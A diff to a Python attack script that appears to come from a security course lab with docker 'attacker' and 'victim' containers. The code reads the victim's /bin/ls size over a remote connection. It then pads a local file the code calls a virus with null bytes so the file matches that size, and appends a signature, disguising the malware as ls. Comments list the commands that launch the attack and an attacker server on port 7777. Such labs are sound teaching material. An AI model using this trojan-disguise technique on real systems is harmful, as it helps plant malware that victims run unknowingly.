@@ -86,11 +86,11 @@ def task2(connection, att_ip, att_port):
     _stdin, stdout, stderr = connection.exec_command("wc -c ~/../../bin/ls | awk {'print $1'}")
     ls_byte = stdout.read().decode()
     virus_byte = os.popen("wc -c ls | awk '{print $1}'").read()
-    padding_size = int(ls_byte) - int(virus_byte) - 8
+    padding_size = int(ls_byte) - int(virus_byte) - 4
     with open('ls', 'ab') as f:
         f.write(b'\x00' * padding_size)
-    with open('ls', 'a') as f:
-        f.write('aabbccdd')
+    with open('ls', 'ab') as f:
+        f.write(b'\xaa\xbb\xcc\xdd')
 
     # original_byte = int(os.popen("wc -c ls | awk '{print $1}'").read())
     # xxd = os.popen("xxd ls | tail -n 1").read()
@@ -136,7 +136,8 @@ if __name__ == '__main__':
 # docker exec -it attacker bash
 # cd ../home/csc2024/id
 # ./crack_attack  172.18.0.3 172.18.0.2 7777
-# ./attack_server 7777
+# ./attacker_server 7777
 
 # ----- run victim -----
 # docker exec -it victim bash
+# xxd ls | tail -n 1
